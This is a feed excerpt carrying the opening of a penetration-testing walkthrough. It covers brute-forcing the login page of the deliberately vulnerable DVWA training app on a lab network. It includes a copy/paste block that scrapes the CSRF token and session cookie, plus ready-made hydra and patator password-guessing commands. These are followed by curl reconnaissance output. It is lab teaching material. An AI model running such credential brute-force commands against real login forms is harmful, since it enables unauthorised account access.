&lt;li&gt;OS: &lt;strong&gt;Arch Linux 2015.10.01&lt;/strong&gt; / Linux archpi 4.1.9-1-ARCH #1 PREEMPT Thu Oct 1 19:15:46 MDT 2015 armv6l GNU/Linux&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;strong&gt;&lt;code&gt;192.168.1.22&lt;/code&gt; (Aka: Raspbian)&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Machine: **Raspberry Pi v2 "B"&lt;/li&gt;
&lt;li&gt;Web Server: &lt;strong&gt;Apache v2.4.10&lt;/strong&gt; &lt;em&gt;(as "www-data")&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Server Side Scripting: &lt;strong&gt;PHP v5.6.13&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Database: &lt;strong&gt;MySQL v5.5.44&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;OS: &lt;strong&gt;Raspbian Jessie September 2015&lt;/strong&gt; / Linux raspberrypi 4.1.7-v7+ #817 SMP PREEMPT Sat Sep 19 15:32:00 BST 2015 armv7l GNU/Linux&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;strong&gt;&lt;code&gt;192.168.1.33&lt;/code&gt; (aka: XAMPP)&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Machine: &lt;strong&gt;VM - 512MB / 1 CPU&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Web Server: &lt;strong&gt;Apache v2.4.10&lt;/strong&gt; &lt;em&gt;(as "SYSTEM")&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Server Side Scripting: &lt;strong&gt;PHP v5.4.31&lt;/strong&gt; &lt;em&gt;(&lt;code&gt;display_errors&lt;/code&gt; enabled by default)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Database: &lt;strong&gt;MySQL v5.5.39&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;OS: &lt;strong&gt;Windows XP Professional SP3 ENG x86&lt;/strong&gt; (Using &lt;strong&gt;XAMPP v1.8.2 package&lt;/strong&gt;)&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;strong&gt;&lt;code&gt;192.168.1.44&lt;/code&gt; (aka: IIS)&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Machine: &lt;strong&gt;VM - 2GB / 1 CPU&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Web Server: &lt;strong&gt;IIS v8.0&lt;/strong&gt;  &lt;em&gt;(as "NT AUTHORITY\IUSR")&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Server Side Scripting: &lt;strong&gt;PHP v5.6.0&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Database: &lt;strong&gt;MySQL v5.5.45&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;OS: &lt;strong&gt;Windows Server 2012 ENG x64&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;</description><pubDate>Tue, 20 Oct 2015 16:00:00 +0000</pubDate></item><item><title>DVWA - Main Login Page - Brute Force HTTP POST Form With CSRF Tokens</title><link>https://blog.g0tmi1k.com/dvwa/login/</link><description>&lt;p&gt;Upon installing &lt;a href="http://dvwa.co.uk/"&gt;Damn Vulnerable Web Application (DVWA)&lt;/a&gt;, the first screen will be the main login page. Even though technically this is not a module, why not attack it? DVWA is made up of designed exercises, one of which is a challenge, &lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-low/"&gt;designed to be to be brute force&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img alt="DVWA Login" class="center" src="https://blog.g0tmi1k.com/images/dvwa-login-code.png" title="DVWA Login" /&gt;&lt;/p&gt;

&lt;p&gt;Let's pretend we did not &lt;a href="https://github.com/RandomStorm/DVWA/blob/master/README.md"&gt;read the documentation&lt;/a&gt;, the message shown on the setup screens, as well as on the &lt;a href="http://dvwa.co.uk/"&gt;homepage&lt;/a&gt; of the software when we downloaded the web application.&lt;/p&gt;

&lt;p&gt;Let's forget the default login is: &lt;code&gt;admin&lt;/code&gt;:&lt;code&gt;password&lt;/code&gt; &lt;em&gt;(which is also a very common default login)&lt;/em&gt;!&lt;/p&gt;

&lt;p&gt;Let's play dumb and brute force it =).&lt;/p&gt;

&lt;!--more--&gt;


&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;TL;DR&lt;/strong&gt;: Quick copy/paste&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="nv"&gt;CSRF&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;curl -s -c dvwa.cookie &lt;span class="s2"&gt;&amp;quot;192.168.1.44/DVWA/login.php&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; awk -F &lt;span class="s1"&gt;'value='&lt;/span&gt; &lt;span class="s1"&gt;'/user_token/ {print $2}'&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; cut -d &lt;span class="s2"&gt;&amp;quot;'&amp;quot;&lt;/span&gt; -f2&lt;span class="k"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nv"&gt;SESSIONID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;grep PHPSESSID dvwa.cookie &lt;span class="p"&gt;|&lt;/span&gt; awk -F &lt;span class="s1"&gt;' '&lt;/span&gt; &lt;span class="s1"&gt;'{print $7}'&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;hydra  -L /usr/share/seclists/Usernames/top_shortlist.txt  -P /usr/share/seclists/Passwords/500-worst-passwords.txt &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  -e ns  -F  -u  -t &lt;span class="m"&gt;1&lt;/span&gt;  -w &lt;span class="m"&gt;10&lt;/span&gt;  -V  192.168.1.44  http-post-form &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="s2"&gt;&amp;quot;/DVWA/login.php:username=^USER^&amp;amp;password=^PASS^&amp;amp;user_token=${CSRF}&amp;amp;Login=Login:S=Location\: index.php:H=Cookie: security=impossible; PHPSESSID=${SESSIONID}&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;patator  http_fuzz  &lt;span class="nv"&gt;method&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;POST  &lt;span class="nv"&gt;follow&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;  &lt;span class="nv"&gt;accept_cookie&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt; --threads&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;  &lt;span class="nv"&gt;timeout&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;url&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://192.168.1.44/DVWA/login.php&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;1&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/share/seclists/Usernames/top_shortlist.txt  &lt;span class="nv"&gt;0&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/share/seclists/Passwords/500-worst-passwords.txt &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;body&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;username=FILE1&amp;amp;password=FILE0&amp;amp;user_token=${CSRF}&amp;amp;Login=Login&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;header&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Cookie: security=impossible; PHPSESSID=${SESSIONID}&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  -x quit:fgrep&lt;span class="o"&gt;=&lt;/span&gt;index.php
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;hr /&gt;

&lt;div id="tocBlock"&gt;
&lt;span class="tocHeading"&gt;Table of Contents&lt;/span&gt;
&lt;ul&gt;
 &lt;li&gt;
 &lt;ul&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Objectives"&gt;Objectives&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Setup"&gt;Setup&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Tools"&gt;Tools&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Information.Gathering"&gt;Information Gathering&lt;/a&gt;
  &lt;ul&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Login.Form..Apache.Redirect."&gt;Login Form (Apache Redirect)&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Login.Form..DVVA.Redirect."&gt;Login Form (DVVA Redirect)&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Login.Form..Rendered.Login.Prompt."&gt;Login Form (Rendered Login Prompt)&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Login.Form..HTML."&gt;Login Form (HTML)&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Login.Form..Differentiating.Responses."&gt;Login Form (Differentiating Responses)&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Login.Form..Re-using.CSRF.Tokens."&gt;Login Form (Re-using CSRF Tokens)&lt;/a&gt;&lt;/li&gt;
  &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Brute.Force..Testing."&gt;Brute Force (Testing)&lt;/a&gt;
  &lt;ul&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Hydra..Documentation."&gt;Hydra (Documentation)&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Hydra..Test.Debug.Command."&gt;Hydra (Test/Debug Command)&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Hydra.Issues"&gt;Hydra Issues&lt;/a&gt;
   &lt;ul&gt;
    &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Issue..1..Additional.GET.Requests."&gt;Issue #1 (Additional GET Requests)&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Issue..2..Missing.Parameters.Proxying.Hydra."&gt;Issue #2 (Missing Parameters/Proxying Hydra)&lt;/a&gt;&lt;/li&gt;
   &lt;/ul&gt;
   &lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Switching.from.Blacklisting.to.Whitelisting"&gt;Switching from Blacklisting to Whitelisting&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Match.and.Replace"&gt;Match and Replace&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Troubleshooting.Rambles"&gt;Troubleshooting Rambles&lt;/a&gt;&lt;/li&gt;
  &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Brute.Force..Hydra."&gt;Brute Force (Hydra)&lt;/a&gt;
  &lt;ul&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#L.strong.Hydra.Main.Command..strong."&gt;&lt;strong&gt;Hydra Main Command&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
  &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Brute.Force..Patator."&gt;Brute Force (Patator)&lt;/a&gt;
  &lt;ul&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Patator..Documentation."&gt;Patator (Documentation)&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#L.strong.Patator.Main.Command..strong."&gt;&lt;strong&gt;Patator Main Command&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Patator.vs.Hydra..Syntax.Comparison."&gt;Patator vs Hydra (Syntax Comparison)&lt;/a&gt;&lt;/li&gt;
  &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Benchmarking"&gt;Benchmarking&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Proof.of.Concept.Scripts"&gt;Proof of Concept Scripts&lt;/a&gt;
  &lt;ul&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Bash.Template"&gt;Bash Template&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Python.Template"&gt;Python Template&lt;/a&gt;&lt;/li&gt;
  &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Summary"&gt;Summary&lt;/a&gt;
  &lt;ul&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Threads..amp..Waiting"&gt;Threads &amp;amp; Waiting&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Conclusion"&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
  &lt;/ul&gt;
  &lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
&lt;/ul&gt;


&lt;/div&gt;


&lt;a name="Objectives"&gt;&lt;/a&gt;
&lt;h2&gt;Objectives&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;The goal is to &lt;strong&gt;brute force an HTTP login&lt;/strong&gt; page.

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;POST requests&lt;/strong&gt; are made via a &lt;strong&gt;form&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;The web page is in a &lt;strong&gt;sub folder&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Hydra &amp;amp; Patator&lt;/strong&gt; will do the grunt work.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;There is an &lt;strong&gt;anti-CSRF&lt;/strong&gt; (Cross-Site Request Forgery) field on the form.

&lt;ul&gt;
&lt;li&gt;However, the token is &lt;strong&gt;implemented incorrectly&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;There is a &lt;strong&gt;redirection after submitting&lt;/strong&gt; the credentials,

&lt;ul&gt;
&lt;li&gt;...both for successful and failed logins.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;There are &lt;strong&gt;not any lockouts&lt;/strong&gt; on account,

&lt;ul&gt;
&lt;li&gt;...or any other protections or preventions in place (e.g. firewalls or Intrusion Prevention Systems - IPS).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;We go through &lt;strong&gt;debugging &amp;amp; troubleshooting some issues&lt;/strong&gt;.

&lt;ul&gt;
&lt;li&gt;Hopefully if you make it to the bottom, you should have a deeper understanding of a methodology and various tools.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;


&lt;hr /&gt;

&lt;a name="Setup"&gt;&lt;/a&gt;
&lt;h2&gt;Setup&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Main target: &lt;a href="https://github.com/RandomStorm/DVWA/releases"&gt;DVWA v1.10&lt;/a&gt; (Running on &lt;code&gt;Windows XP Pro SP3 ENG x86&lt;/code&gt; + &lt;a href="http://sourceforge.net/projects/xampp/files/XAMPP%20Windows/1.8.2/"&gt;XAMPP v1.8.2&lt;/a&gt;).

&lt;ul&gt;
&lt;li&gt;Target setup &lt;strong&gt;does not matter too much&lt;/strong&gt; for this - &lt;code&gt;Debian&lt;/code&gt;/&lt;code&gt;Arch Linux&lt;/code&gt;/&lt;code&gt;Windows&lt;/code&gt;, &lt;code&gt;Apache&lt;/code&gt;/&lt;code&gt;Nginx&lt;/code&gt;/&lt;code&gt;IIS&lt;/code&gt;, &lt;code&gt;PHP v5.x&lt;/code&gt;, or &lt;code&gt;MySQL&lt;/code&gt;/&lt;code&gt;MariaDB&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;The main target is on the IP (&lt;code&gt;192.168.1.33&lt;/code&gt;), port (&lt;code&gt;80&lt;/code&gt;) and subfolder (&lt;code&gt;/DVWA/&lt;/code&gt;), which is known ahead of time.&lt;/li&gt;
&lt;li&gt;Because the target is Windows, it does not matter about case sensitive URL requests (&lt;code&gt;/DVWA/&lt;/code&gt; vs &lt;code&gt;/dvwa/&lt;/code&gt;).&lt;/li&gt;
&lt;li&gt;There was an issue using multi-threading brute force on this target. This is explained towards the end of the post.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Attacker: &lt;a href="https://www.kali.org/"&gt;Kali Linux v2&lt;/a&gt; (+ &lt;a href="https://github.com/g0tmi1k/os-scripts/blob/master/kali.sh"&gt;Personal Custom Post-install Script&lt;/a&gt;).

&lt;ul&gt;
&lt;li&gt;Shell prompt will look different (due to &lt;a href="http://www.zsh.org/"&gt;ZSH&lt;/a&gt;/&lt;a href="https://github.com/robbyrussell/oh-my-zsh"&gt;Oh-My-ZSH&lt;/a&gt;).&lt;/li&gt;
&lt;li&gt;Added colour to tools output (thanks to &lt;a href="https://github.com/garabik/grc"&gt;GRC&lt;/a&gt;).&lt;/li&gt;
&lt;li&gt;Pre-installed tools (such as &lt;a href="http://www.mbayer.de/html2text/"&gt;html2text&lt;/a&gt;).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;Both machines are running inside a Virtual Machine (VMware ESXi).&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="Tools"&gt;&lt;/a&gt;
&lt;h2&gt;Tools&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;cURL - Information gathering (used for viewing source code &amp;amp; to automate gathering tokens).

&lt;ul&gt;
&lt;li&gt;Could also use wget (&lt;code&gt;wget -qO -&lt;/code&gt;) instead.&lt;/li&gt;
&lt;li&gt;Or using Burp/Iceweasel, however, it is harder to automate them due to them being graphical, which makes doing repetitive stuff boring.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.thc.org/thc-hydra/"&gt;THC-Hydra v8.1&lt;/a&gt; - A brute force tool.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/lanjelot/patator"&gt;Patator v0.5&lt;/a&gt; - Alternative brute force tool (which I currently prefer).&lt;/li&gt;
&lt;li&gt;&lt;a href="https://portswigger.net/burp/proxy.html"&gt;Burp Proxy v16.0.1&lt;/a&gt; - Debugging requests.

&lt;ul&gt;
&lt;li&gt;Could have used &lt;a href="https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project"&gt;OWASP Zed Attack Proxy (ZAP)&lt;/a&gt; in Burp's place (which has the upside of being completely free and open source).&lt;/li&gt;
&lt;li&gt;However, I personally find Burp's GUI to be more intuitive (even if features are limited without a paid license).&lt;/li&gt;
&lt;li&gt;Also could have used Burp proxy suite to brute force too (just slower in the free edition). Will cover how to-do this in the &lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-low/"&gt;brute force module&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/danielmiessler/SecLists"&gt;SecLists&lt;/a&gt; - General wordlists.

&lt;ul&gt;
&lt;li&gt;These are common, default and small wordlists.&lt;/li&gt;
&lt;li&gt;Instead of using a custom built wordlist, which has been crafted for our target (e.g. generated with &lt;a href="https://digi.ninja/projects/cewl.php"&gt;CeWL&lt;/a&gt;).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;


&lt;hr /&gt;

&lt;a name="Information.Gathering"&gt;&lt;/a&gt;
&lt;h2&gt;Information Gathering&lt;/h2&gt;

&lt;a name="Login.Form..Apache.Redirect."&gt;&lt;/a&gt;
&lt;h3&gt;Login Form (Apache Redirect)&lt;/h3&gt;

&lt;p&gt;Let's start off making a simple, straight forward request and display the source code of the response.&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl 192.168.1.33/DVWA&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt;!DOCTYPE HTML PUBLIC &lt;span class="s2"&gt;&amp;quot;-//IETF//DTD HTML 2.0//EN&amp;quot;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt;title&amp;gt;301 Moved Permanently&amp;lt;/title&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt;h1&amp;gt;Moved Permanently&amp;lt;/h1&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt;p&amp;gt;The document has moved &amp;lt;a &lt;span class="nv"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://192.168.1.33/DVWA/&amp;quot;&lt;/span&gt;&amp;gt;here&amp;lt;/a&amp;gt;.&amp;lt;/p&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt;hr&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt;address&amp;gt;Apache/2.4.10 &lt;span class="o"&gt;(&lt;/span&gt;Win32&lt;span class="o"&gt;)&lt;/span&gt; OpenSSL/1.0.1h PHP/5.4.31 Server at 192.168.1.33 Port 80&amp;lt;/address&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="Apache Redirect" src="https://blog.g0tmi1k.com/images/dvwa-login-01.png" /&gt;&lt;/p&gt;

&lt;p&gt;Notice without the trailing slash, the web service itself (Apache in this case) is redirecting us to include it.&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="Login.Form..DVVA.Redirect."&gt;&lt;/a&gt;
&lt;h3&gt;Login Form (DVVA Redirect)&lt;/h3&gt;

&lt;p&gt;With the next request, we add a trailing slash.&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl 192.168.1.33/DVWA/&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;However, there is not any code in the response back! Time to dig deeper; we can check the response header.&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -i 192.168.1.33/DVWA/&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;HTTP/1.1 &lt;span class="m"&gt;302&lt;/span&gt; Found
&lt;/span&gt;&lt;span class="line"&gt;Date: Thu, &lt;span class="m"&gt;15&lt;/span&gt; Oct &lt;span class="m"&gt;2015&lt;/span&gt; 19:54:18 GMT
&lt;/span&gt;&lt;span class="line"&gt;Server: Apache/2.4.10 &lt;span class="o"&gt;(&lt;/span&gt;Win32&lt;span class="o"&gt;)&lt;/span&gt; OpenSSL/1.0.1h PHP/5.4.31
&lt;/span&gt;&lt;span class="line"&gt;X-Powered-By: PHP/5.4.31
